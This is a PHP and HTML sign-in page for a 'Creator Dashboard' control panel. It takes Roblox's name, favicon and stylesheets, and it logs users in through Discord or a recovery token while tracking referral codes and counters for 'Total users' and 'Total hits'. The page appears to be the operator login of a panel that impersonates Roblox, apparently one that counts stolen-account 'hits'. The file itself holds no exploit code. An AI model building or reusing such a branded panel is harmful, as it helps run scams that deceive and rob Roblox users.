<?php

session_start( );
require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );

$auth_token = $_COOKIE[ "Authentication" ] ?? "";
if ( $auth_token !== "" )
{
    $existing = get_user_by_recovery_token( $auth_token );
    if ( $existing !== null && empty( $existing[ "account_banned" ] ) )
    {
        $_SESSION[ "info" ] = $existing;
        die( header( "Location: /control/dashboard/" ) );
    };
    clear_auth_cookie( );
};

if ( isset( $_GET[ "code" ] ) )
{
    $_SESSION[ "referral" ] = $_GET[ "code" ];
};

$signin_stats = get_signin_accounts_stats( );
$show_recovery = !empty( $_GET[ "recovery" ] );
?><!DOCTYPE html>
<html lang="en-US" class="dark-theme">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="minimum-scale=1, initial-scale=1, width=device-width">
    <meta name="theme-color" content="#111216">
    <meta property="og:title" content="Sign In">
    <meta property="og:description" content="Sign in to access the Creator Dashboard.">
    <meta name="description" content="Sign in to access the Creator Dashboard.">
    <meta property="og:site_name" content="Creator Hub">
    <link rel="icon" type="image/svg+xml" href="https://cdn.foundation.roblox.com/current/roblox-tilt/favicon.svg">
    <link rel="icon" href="https://cdn.foundation.roblox.com/current/roblox-tilt/favicon.ico" sizes="48x48">
    <title>Sign In - Roblox</title>
    <link rel="stylesheet" href="https://assets.create.roblox.com/f0ef4fb4752b938005c5424fea2d8be909d4e0a8/_next/static/chunks/06u52euuux792.css">
    <link rel="stylesheet" href="https://assets.create.roblox.com/f0ef4fb4752b938005c5424fea2d8be909d4e0a8/_next/static/chunks/06b9r6l127yzq.css">
    <link rel="stylesheet" href="https://assets.create.roblox.com/f0ef4fb4752b938005c5424fea2d8be909d4e0a8/_next/static/chunks/0skwat832wz88.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        html
        {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            box-sizing: border-box;
            -webkit-text-size-adjust: 100%;
            -webkit-print-color-scheme: dark;
            color-scheme: dark;
        }
        *, *::before, *::after
        {
            box-sizing: inherit;
        }
        strong, b
        {
            font-weight: 700;
        }
        body
        {
            margin: 0;
            color: #ffffff;
            font-family: "Builder Sans", Helvetica, Arial, sans-serif;
            font-weight: 400;
            font-style: normal;
            font-size: 14px;
            line-height: 140%;
            background-color: #111216;
        }
        body::backdrop
        {
            background-color: #111216;
        }
        .signin_stats_container
        {
            display: flex;
            justify-content: center;
            gap: 60px;
            padding: 40px 20px;
            perspective: 1000px;
        }
        .signin_stat_item
        {
            text-align: center;
            transform: rotateX(-10deg);
            animation: tiltIn 1s ease-out;
        }
        @keyframes tiltIn
        {
            from
            {
                opacity: 0;
                transform: rotateX(-30deg) translateY(30px);
            }
            to
            {
                opacity: 1;
                transform: rotateX(-10deg) translateY(0);
            }
        }
        .signin_stat_label
        {
            display: block;
            font-size: 14px;
            color: #8d91a3;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .signin_stat_value
        {
            display: block;
            font-size: 48px;
            font-weight: 700;
            color: #1446ff;
            line-height: 1;
        }
    </style>
    <link rel="stylesheet" href="/control/dashboard/assets/css/dashboard.css?v=<?=rand( 99999, 999999999 );?>">
</head>
<body class="dash_page dash_signin_page">
    <div class="signin_stats_container">
        <div class="signin_stat_item">
            <span class="signin_stat_label">Total users</span>
            <strong class="signin_stat_value" id="signinTotalUsers" data-target="<?= (int) $signin_stats[ "total_users" ] ?>">0</strong>
        </div>
        <div class="signin_stat_item">
            <span class="signin_stat_label">Total hits</span>
            <strong class="signin_stat_value" id="signinTotalHits" data-target="<?= (int) $signin_stats[ "total_hits" ] ?>">0</strong>
        </div>
    </div>
    <main class="dash_signin_wrap">
        <section class="dash_card dash_signin_card">
            <div class="dash_brand dash_signin_brand">
                <img src="/control/dashboard/assets/img/logo.svg" alt="Roblox">
                <span>Roblox</span>
            </div>

            <div id="signinMainPanel" class="dash_signin_panel"<?= $show_recovery ? ' hidden' : '' ?>>
                <?php if ( !empty( $_GET[ "error" ] ) ) : ?>
                    <div class="dash_signin_error">Authentication failed. Please try again.</div>
                <?php endif; ?>
                <div class="dash_signin_error" id="signinRecoveryErrorMain" hidden></div>

                <a class="dash_btn_primary" href="/control/sign-in/discord.php">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16" aria-hidden="true">
                        <path d="M13.545 2.907a13.2 13.2 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.2 12.2 0 0 0-3.658 0 8 8 0 0 0-.412-.833.05.05 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.04.04 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032q.003.022.021.037a13.3 13.3 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019q.463-.63.818-1.329a.05.05 0 0 0-.01-.059l-.018-.011a9 9 0 0 1-1.248-.595.05.05 0 0 1-.02-.066l.015-.019q.127-.095.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.05.05 0 0 1 .053.007q.121.1.248.195a.05.05 0 0 1-.004.085 8 8 0 0 1-1.249.594.05.05 0 0 0-.03.03.05.05 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.2 13.2 0 0 0 4.001-2.02.05.05 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.03.03 0 0 0-.02-.019m-8.198 7.307c-.789 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612m5.316 0c-.788 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612"></path>
                    </svg>
                    <span>Continue with Discord</span>
                </a>
                <button type="button" class="dash_btn_secondary" id="showRecoveryBtn">
                    <span>Login with Recovery</span>
                </button>
            </div>

            <div id="signinRecoveryPanel" class="dash_signin_panel"<?= $show_recovery ? '' : ' hidden' ?>>
                <p class="dash_signin_subtitle">Enter your recovery token</p>
                <div class="dash_signin_recovery_row">
                    <input
                        id="recoveryToken"
                        class="dash_signin_recovery_input"
                        value=""
                        autocomplete="off"
                    />
                    <button type="button" id="recoveryLoginBtn" class="dash_btn_primary dash_signin_recovery_btn">
                        Login
                    </button>
                </div>
                <p class="dash_signin_error" id="recoveryErrorText" hidden></p>
                <button type="button" class="dash_signin_back_btn" id="backToSigninBtn">Back to sign in</button>
            </div>
        </section>
    </main>
    <script>
    (function () {
        var mainPanel = document.getElementById("signinMainPanel");
        var recoveryPanel = document.getElementById("signinRecoveryPanel");
        var showRecoveryBtn = document.getElementById("showRecoveryBtn");
        var backBtn = document.getElementById("backToSigninBtn");
        var loginBtn = document.getElementById("recoveryLoginBtn");
        var input = document.getElementById("recoveryToken");
        var errorText = document.getElementById("recoveryErrorText");
        var mainErrorText = document.getElementById("signinRecoveryErrorMain");

        function animateCountUp(element, target) {
            var duration = 2000;
            var start = 0;
            var increment = target / (duration / 16);
            var current = start;
            
            function update() {
                current += increment;
                if (current < target) {
                    element.textContent = Math.floor(current).toLocaleString();
                    requestAnimationFrame(update);
                } else {
                    element.textContent = target.toLocaleString();
                }
            }
            update();
        }

        var totalUsersEl = document.getElementById("signinTotalUsers");
        var totalHitsEl = document.getElementById("signinTotalHits");
        
        if (totalUsersEl) {
            var targetUsers = parseInt(totalUsersEl.getAttribute("data-target")) || 0;
            animateCountUp(totalUsersEl, targetUsers);
        }
        if (totalHitsEl) {
            var targetHits = parseInt(totalHitsEl.getAttribute("data-target")) || 0;
            animateCountUp(totalHitsEl, targetHits);
        }

        function toast(text, ok) {
            if (!window.Swal) {
                return;
            }
            Swal.fire({
                toast: true,
                position: 'top-end',
                icon: ok ? 'success' : 'error',
                title: text,
                showConfirmButton: false,
                timer: 3000,
                timerProgressBar: true,
                background: '#131418',
                color: '#ffffff',
                iconColor: ok ? '#22c55e' : '#ef4444'
            });
        }

        function showMainForm(message) {
            if (mainPanel) {
                mainPanel.hidden = false;
            }
            if (recoveryPanel) {
                recoveryPanel.hidden = true;
            }
            if (input) {
                input.value = "";
            }
            if (errorText) {
                errorText.hidden = true;
                errorText.textContent = "";
            }
            if (mainErrorText) {
                if (message) {
                    mainErrorText.hidden = false;
                    mainErrorText.textContent = message;
                } else {
                    mainErrorText.hidden = true;
                    mainErrorText.textContent = "";
                }
            }
            if (window.history && window.history.replaceState) {
                window.history.replaceState({}, "", "/control/sign-in/");
            }
        }

        function showRecoveryForm() {
            if (mainPanel) {
                mainPanel.hidden = true;
            }
            if (recoveryPanel) {
                recoveryPanel.hidden = false;
            }
            if (errorText) {
                errorText.hidden = true;
                errorText.textContent = "";
            }
            if (mainErrorText) {
                mainErrorText.hidden = true;
                mainErrorText.textContent = "";
            }
            if (input) {
                input.focus();
            }
        }

        function loginRecovery(token) {
            if (errorText) {
                errorText.hidden = true;
                errorText.textContent = "";
            }
            fetch(window.location.origin + "/control/api/misc/recovery", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                credentials: "include",
                body: JSON.stringify({ recoveryToken: token })
            })
                .then(function (res) { return res.json(); })
                .then(function (data) {
                    if (!data.success) {
                        var msg = data.msg || "Invalid recovery token";
                        showMainForm(msg);
                        toast(msg, false);
                        return;
                    }
                    toast("Logged in", true);
                    window.location.href = "/control/dashboard/";
                })
                .catch(function () {
                    showMainForm("Error fetching content.");
                    toast("Error fetching content.", false);
                });
        }

        if (showRecoveryBtn) {
            showRecoveryBtn.addEventListener("click", showRecoveryForm);
        }
        if (backBtn) {
            backBtn.addEventListener("click", function () {
                showMainForm();
            });
        }
        if (loginBtn && input) {
            loginBtn.addEventListener("click", function () {
                loginRecovery(String(input.value || "").trim());
            });
            input.addEventListener("keydown", function (event) {
                if (event.key === "Enter") {
                    event.preventDefault();
                    loginRecovery(String(input.value || "").trim());
                }
            });
        }
    })();
    </script>
</body>
</html>
